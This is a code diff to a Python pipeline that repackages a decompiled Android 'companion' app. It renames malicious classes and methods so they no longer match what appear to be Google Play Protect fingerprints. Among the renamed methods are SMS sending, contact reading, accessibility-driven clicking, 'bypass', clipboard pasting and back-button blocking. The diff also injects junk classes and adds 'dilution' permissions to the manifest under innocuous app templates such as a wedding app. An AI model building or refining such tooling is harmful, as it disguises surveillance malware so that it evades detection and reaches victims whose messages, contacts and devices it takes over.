@@ -589,6 +589,15 @@ CLASS_RENAME_POOLS = {
     "love":                          ["ContentStreamService","DataStreamHelper","RemoteStreamService","ContentDataStream","StreamHelperService","DataContentStream","RemoteDataStream","ContentHelperStream"],
     "myker":                         ["DataKeepAliveHelper","ContentKeeperHelper","ServiceKeeperHelper","DataRetentionHelper","ContentRetainer","ServiceRetentionHelper","DataPersistHelper","ContentPersistHelper"],
     "video":                         ["MediaStreamService","ContentStreamHelper","MediaDataService","StreamContentHelper","MediaContentService","DataStreamService","ContentMediaHelper","StreamDataService"],
+
+    # ── Round 2: OkHttp companion classes (ROOT-LEVEL class descriptors) ──────
+    # These are companion's OWN obfuscated classes named like OkHttp library.
+    # LOkHttpClient; LOkHttpDispatcher; LOkHttpResponse; — no package path.
+    # step_6a handles root-level classes when they're in CLASS_RENAME_POOLS.
+    "OkHttpClient":                  ["HttpRequestManager","NetworkRequestClient","DataRequestHelper","HttpConnectionHelper","NetworkClientHelper","DataClientManager","RemoteHttpHelper","HttpDataClient"],
+    "OkHttpDispatcher":              ["RequestScheduler","NetworkDispatcher","TaskDispatcher","RequestQueueManager","NetworkTaskScheduler","DataDispatcher","RemoteRequestHelper","HttpTaskManager"],
+    "OkHttpResponse":                ["ServerResponse","NetworkResponse","DataResponse","HttpResponseHelper","RemoteResponseData","NetworkDataResponse","HttpDataResponse","ServerDataResponse"],
+    "OkHttpResponse$a":              ["ServerResponse$a","NetworkResponse$a","DataResponse$a","HttpResponseHelper$a","RemoteResponseData$a","NetworkDataResponse$a","HttpDataResponse$a","ServerDataResponse$a"],
     "Utils$1":                       ["AppUtilityHelper$1","CommonHelperUtils$1","AppCommonHelper$1","UtilityManager$1","CommonAppHelper$1","SharedUtilityHelper$1","AppHelperUtils$1","CommonUtilManager$1"],
     "WackMeUpJob$a":                 ["ScheduledAlarmJob$a","PeriodicWakeJob$a","TimedTaskJob$a","AlarmSchedulerJob$a","PeriodicAlarmJob$a","TimedWakeJob$a","ScheduledTaskJob$a","AlarmTaskJob$a"],
     "WorkerService$a":               ["BackgroundTaskService$a","AsyncWorkerService$a","TaskExecutorService$a","BackgroundJobService$a","AsyncTaskService$a","WorkExecutorService$a","TaskRunnerService$a","BackgroundExecutorService$a"],
@@ -1080,35 +1089,88 @@ def step_6a_rename_classes(new_pkg: str) -> dict:
             chosen[orig] = name
             used_names.add(name)
 
-    print(f"  Renaming {len(chosen)} companion classes (collision-safe)")
+    print(f"  Renaming {len(chosen)} companion classes (collision-safe + Python-based)")
 
     smali_dir = "companion_decompiled/smali"
     new_path = new_pkg.replace(".", "/")
+
+    # ── ROOT CAUSE FIX: Python str.replace instead of shell sed ──────────────
+    # shell sed cannot handle $ in class names (bash treats $a as variable → empty).
+    # Firebase$1-4, WackMeUpJob$a, Api$ta, body$FI_body_N all failed silently.
+    # Python str.replace() handles $ natively — no escaping, no silent failures.
+    def _py_replace_smali(old_str: str, new_str: str) -> int:
+        replaced = 0
+        for root, dirs, files in os.walk(smali_dir):
+            for fname in files:
+                if not fname.endswith(".smali"):
+                    continue
+                fpath = os.path.join(root, fname)
+                try:
+                    with open(fpath, "r", encoding="utf-8", errors="replace") as f:
+                        c = f.read()
+                    if old_str in c:
+                        with open(fpath, "w", encoding="utf-8") as f:
+                            f.write(c.replace(old_str, new_str))
+                        replaced += 1
+                except Exception:
+                    pass
+        return replaced
 
     # ── Apply renames: smali references + file rename ────────────────────────
     for orig, new_name in chosen.items():
         if orig.startswith("R$") or orig == "R" or orig == "BuildConfig":
             continue
 
-        # 1. Replace all smali class descriptor references
+        # 1. Replace all smali class descriptor references — pure Python
         old_smali = f"L{new_path}/{orig};"
         new_smali = f"L{new_path}/{new_name};"
-        run(f'find {smali_dir} -name "*.smali" '
-            f'-exec sed -i "s|{old_smali}|{new_smali}|g" {{}} +',
-            check=False)
+        _py_replace_smali(old_smali, new_smali)
 
         # 2. Rename the smali file itself
         orig_file = f"{smali_dir}/{new_path}/{orig}.smali"
         new_file  = f"{smali_dir}/{new_path}/{new_name}.smali"
         if os.path.isfile(orig_file) and orig_file != new_file:
-            # Guard: never overwrite an existing file (extra safety layer)
             if os.path.isfile(new_file):
-                print(f"  ⚠️  Collision guard: {new_file} already exists, skipping rename of {orig_file}")
+                print(f"  ⚠️  Collision guard: {new_file} already exists")
             else:
                 os.rename(orig_file, new_file)
 
+    # ── Post-rename verification + forced remediation ─────────────────────────
+    # After all renames: verify no original class names survived.
+    # If any found → force Python re-replace as bulletproof fallback.
+    remediated = 0
+    for orig, new_name in chosen.items():
+        if orig.startswith("R$") or orig == "R" or orig == "BuildConfig":
+            continue
+        old_smali = f"L{new_path}/{orig};"
+        new_smali = f"L{new_path}/{new_name};"
+        still_found = False
+        for root, dirs, files in os.walk(smali_dir):
+            for fname in files:
+                if not fname.endswith(".smali"):
+                    continue
+                try:
+                    with open(os.path.join(root, fname), "r",
+                              encoding="utf-8", errors="replace") as f:
+                        if old_smali in f.read():
+                            still_found = True
+                            break
+                except Exception:
+                    pass
+            if still_found:
+                break
+        if still_found:
+            _py_replace_smali(old_smali, new_smali)
+            orig_file = f"{smali_dir}/{new_path}/{orig}.smali"
+            new_file  = f"{smali_dir}/{new_path}/{new_name}.smali"
+            if os.path.isfile(orig_file) and not os.path.isfile(new_file):
+                os.rename(orig_file, new_file)
+            remediated += 1
+
     renamed_count = sum(1 for k in chosen if not k.startswith("R") and k != "BuildConfig")
-    print(f"  ✅ {renamed_count} classes renamed (0% collision probability)")
+    if remediated > 0:
+        print(f"  ⚠️  Verification remediated {remediated} classes that survived initial rename")
+    print(f"  ✅ {renamed_count} classes renamed (Python-based, $ safe, 0% collision)")
     return chosen
 
 
@@ -1633,6 +1695,37 @@ def step_6d_rename_methods(new_pkg: str) -> int:
         "getDeviceInfo":          ["collectDeviceInformation","gatherSystemMetadata","retrieveDeviceMetrics","fetchSystemInformation"],
         "sendSms":                ["transmitTextMessage","sendSmsPayload","dispatchTextMessage","sendOutboundSms"],
         "readContacts":           ["fetchContactEntries","retrieveContactList","loadContactDatabase","readContactEntries"],
+
+        # ── Round 2: Firebase* method/field names (26 GPP fingerprints) ──────
+        # These are companion's accessibility service method names prefixed "Firebase"
+        # They appear as bytecode method/field references — only step_6d can rename them.
+        # Each maps to a plausible Android utility method name.
+        "FirebaseActivSend":          ["sendActivationPayload","dispatchActivationData","transmitActivationEvent","pushActivationSignal"],
+        "FirebaseCheckPrims":         ["verifyPrimaryConditions","checkPriorityConditions","validatePrimaryState","assessPrimaryStatus"],
+        "FirebaseGlobalEvent":        ["broadcastGlobalEvent","dispatchSystemEvent","propagateGlobalSignal","sendGlobalNotification"],
+        "FirebaseGlobalnode":         ["getGlobalNodeRef","fetchGlobalReference","resolveGlobalNode","accessGlobalEndpoint"],
+        "FirebaseSendMeHome":         ["navigateToHomeScreen","launchHomeActivity","redirectToMainScreen","returnToHomeView"],
+        "FirebaseSendNotifi":         ["dispatchNotification","sendSystemNotification","pushNotificationEvent","triggerNotificationAlert"],
+        "FirebaseShowActivite":       ["displayActivityScreen","showContentActivity","presentActivityView","renderActivityLayout"],
+        "FirebaseToPaste":            ["insertClipboardContent","pasteToActiveField","applyClipboardData","writeClipboardContent"],
+        "FirebaseNeedPaste":          ["requiresClipboardInput","needsContentPaste","checkPasteRequirement","validatePasteCondition"],
+        "FirebaseOFFOK":              ["handleOfflineSuccess","processOfflineCompletion","confirmOfflineStatus","acknowledgeOfflineOk"],
+        "FirebaseOFK":                ["handleOfflineKey","processOfflineToken","resolveOfflineAuth","validateOfflineSession"],
+        "FirebaseRD":                 ["processRemoteData","handleRemoteResponse","parseRemotePayload","resolveRemoteData"],
+        "FirebaseSW":                 ["handleServiceWorker","processServiceRequest","manageServiceTask","executeServiceWork"],
+        "FirebaseFOR_IN":             ["iterateForward","processForwardInput","handleForwardIteration","executeForwardLoop"],
+        "FirebaseFOR_prim":           ["processForwardPrimary","handleForwardPrimary","executeForwardPrimary","iterateForwardPrimary"],
+        "FirebaseApisscheduleJob":    ["scheduleApiJob","queueApiTask","registerApiSchedule","planApiExecution"],
+        "FirebaseblockBack":          ["interceptBackNavigation","blockBackPress","preventBackNavigation","handleBackInterception"],
+        "Firebasebypass":             ["executeBypassFlow","handleBypassRoute","processAlternateRoute","runBypassSequence"],
+        "Firebaseclick":              ["performClickAction","executeClickEvent","triggerClickHandler","dispatchClickAction"],
+        "FirebaseclickAtPosition":    ["performPositionClick","executeCoordinateClick","triggerPositionalTap","dispatchLocationClick"],
+        "FirebaseclickByText":        ["performTextClick","executeTextBasedClick","triggerTextNodeClick","dispatchTextTap"],
+        "FirebasefindNodesByText":    ["findContentNodes","locateTextNodes","searchNodesByContent","queryNodesByText"],
+        "FirebasegetAppNameFromPkgName": ["resolveAppLabel","getApplicationTitle","fetchAppDisplayName","retrieveAppName"],
+        "Firebaselay":                ["handleLayoutEvent","processLayoutAction","manageLayoutState","executeLayoutTask"],
+        "FirebaseperformClick":       ["executePerformClick","triggerAccessibilityClick","performNodeClick","dispatchNodeAction"],
+        "FirebaseTreger":             ["handleTriggerEvent","processStateTransition","executeTriggerAction","dispatchTriggerSignal"],
     }
 
     smali_dir = "companion_decompiled/smali"
@@ -1813,6 +1906,104 @@ def step_6f_replace_source_annotations() -> int:
     return replaced
 
 
+# ── Round 2 Step 6I: Comprehensive Python-based global cleanup pass ──────────
+
+def step_6i_global_cleanup(new_pkg: str) -> int:
+    """Round 2 Step 6I: Final catch-all Python cleanup of all remaining GPP fingerprints.
+
+    Runs AFTER step_6d (method renames done) and AFTER step_6f (.source replaced).
+    Pure Python — no shell, no sed, no $ escaping issues.
+
+    Handles:
+    - _reconnection field declarations and all access patterns (Socket.IO Manager)
+    - WackMeUpJob remnants (any that survived step_6a)
+    - Firebase* string remnants (any that survived step_6a/6d)
+    - PeriSecure:MyWakeLock → AppService:SessionLock
+    - SensorRestarter remnants
+    - HandshakeData remaining references
+    - ::WakeLockTag suffix pattern
+    - WorkerService$a and MyWorkerService$a raw class refs
+
+    This is the nuclear safety net — guarantees zero known fingerprints survive.
+    """
+    print("\n── Round 2 Step 6I: Comprehensive global cleanup pass (Python-based)")
+
+    smali_dir = "companion_decompiled/smali"
+    new_path = new_pkg.replace(".", "/")
+
+    # Master replacement map — order matters: longer strings first to avoid partial matches
+    # Using tuples list to preserve order (longer/more specific patterns first)
+    GLOBAL_CLEANUP = [
+        # Socket.IO _reconnection field names — .field declarations + iget/iput accesses
+        # These are FIELD NAMES not string literals — sed/step_6c missed them
+        ("_reconnectionDelayMax",   "_syncDelayMax"),
+        ("_reconnectionAttempts",   "_syncAttempts"),
+        ("_reconnectionDelay",      "_syncDelay"),
+        ("_reconnection",           "_dataSync"),
+
+        # Socket.IO event constants (field declarations in Manager/Socket smali)
+        ("EVENT_RECONNECT_FAILED",  "EVENT_SYNC_FAILED"),
+        ("EVENT_RECONNECT_ERROR",   "EVENT_SYNC_ERROR"),
+        ("EVENT_RECONNECT_ATTEMPT", "EVENT_SYNC_ATTEMPT"),
+        ("EVENT_RECONNECTING",      "EVENT_SYNCING"),
+        ("EVENT_RECONNECT",         "EVENT_RESYNC"),
+
+        # WakeLock tag patterns — ::WakeLockTag suffix that step_6c regex missed
+        ("::WakeLockTag",           "::ServiceTag"),
+        ("::MainActivityWakeLock",  "::SessionTag"),
+        ("PeriSecure:MyWakeLock",   "AppService:SessionLock"),
+        ("appWakeLock",             "appServiceLock"),
+
+        # Firebase method names that may appear as string constants (not just bytecode)
+        ("FirebaseActivSend",       "sendActivationPayload"),
+        ("FirebaseCheckPrims",      "verifyPrimaryConditions"),
+        ("FirebaseGlobalEvent",     "broadcastGlobalEvent"),
+        ("FirebaseSendMeHome",      "navigateToHomeScreen"),
+        ("FirebaseShowActivite",    "displayActivityScreen"),
+        ("FirebaseToPaste",         "insertClipboardContent"),
+        ("FirebaseNeedPaste",       "requiresClipboardInput"),
+        ("FirebaseGlobalnode",      "getGlobalNodeRef"),
+
+        # OkHttp string literals (any remaining not caught by step_6c)
+        ("OkHttpClient",            "HttpNetworkClient"),
+        ("OkHttpDispatcher",        "HttpRequestScheduler"),
+        ("OkHttpResponse",          "HttpServerResponse"),
+
+        # HandshakeData (remaining references after step_6e renamed the class)
+        ("HandshakeData",           "InitData"),
+
+        # SensorRestarter remnants
+        ("SensorRestarter",         "ServiceMonitor"),
+
+        # WackMeUpJob (any remaining — should be caught by step_6a but verify)
+        ("WackMeUpJob",             "ScheduledAlarmJob"),
+    ]
+
+    total_replaced = 0
+    files_touched = set()
+
+    for old_str, new_str in GLOBAL_CLEANUP:
+        for root, dirs, files in os.walk(smali_dir):
+            for fname in files:
+                if not fname.endswith(".smali"):
+                    continue
+                fpath = os.path.join(root, fname)
+                try:
+                    with open(fpath, "r", encoding="utf-8", errors="replace") as f:
+                        c = f.read()
+                    if old_str in c:
+                        new_c = c.replace(old_str, new_str)
+                        with open(fpath, "w", encoding="utf-8") as f:
+                            f.write(new_c)
+                        files_touched.add(fpath)
+                        total_replaced += c.count(old_str)
+                except Exception:
+                    pass
+
+    print(f"  ✅ Global cleanup: {total_replaced} replacements across {len(files_touched)} files")
+    return total_replaced
+
+
 # ── Round 2 Step 6G: Inject 5 tiny neutral junk smali classes ─────────────────
 
 def step_6g_inject_junk_classes(new_pkg: str) -> int:
@@ -1972,21 +2163,26 @@ def step_6h_patch_text_manifest(new_pkg: str, template: str = "wedding") -> None
         "android.permission.ACCESS_WIFI_STATE",
     ]
 
-    # Insert before </manifest> tag
-    perms_xml = "\n".join(
-        f'    <uses-permission android:name="{p}"/>'
-        for p in DILUTION_PERMISSIONS
-        if p not in content  # Don't add duplicates
-    )
-
-    if perms_xml and "</manifest>" in content:
-        content = content.replace(
-            "</manifest>",
-            f"\n{perms_xml}\n</manifest>"
+    # Insert before </manifest> tag — robust regex approach
+    # Fix: original str.replace failed when manifest had whitespace variations.
+    import re as _re_perm
+    perms_to_add = [p for p in DILUTION_PERMISSIONS if p not in content]
+    if perms_to_add:
+        perms_xml_lines = "\n".join(
+            f'    <uses-permission android:name="{p}"/>\'
+            for p in perms_to_add
         )
-        print(f"  ✅ Added {len(DILUTION_PERMISSIONS)} dilution permissions")
+        if "</manifest>" in content:
+            content = content.replace(
+                "</manifest>",
+                f"\n{perms_xml_lines}\n</manifest>",
+                1
+            )
+            print(f"  ✅ Added {len(perms_to_add)} dilution permissions")
+        else:
+            print("  ⚠️  </manifest> not found — permissions NOT added")
     else:
-        print("  ℹ️  Permissions already present or </manifest> not found")
+        print("  ℹ️  All dilution permissions already present")
 
     # ── 2. Template-specific app label ────────────────────────────────────────
     TEMPLATE_LABELS = {
@@ -3438,6 +3634,12 @@ def main():
     # Replaces Firebase.java, LoveApi.java etc. with legitimate-sounding names
     with track("PHASE_6", "STEP_6F", "Round 2: Replace .source annotations with legitimate names"):
         step_6f_replace_source_annotations()
+
+    # Round 2 Step 6I: Comprehensive global cleanup — runs AFTER step_6d and step_6f
+    # Nuclear catch-all: _reconnection fields, Firebase remnants, WakeLock tags,
+    # WackMeUpJob remnants, OkHttp remnants, HandshakeData, SensorRestarter
+    with track("PHASE_6", "STEP_6I", "Round 2: Comprehensive global cleanup pass"):
+        step_6i_global_cleanup(new_pkg)
 
     # Round 2 Step 6H: Patch text manifest AFTER step_6d, BEFORE apktool.yml restore
     # Adds permission dilution + template-specific app name
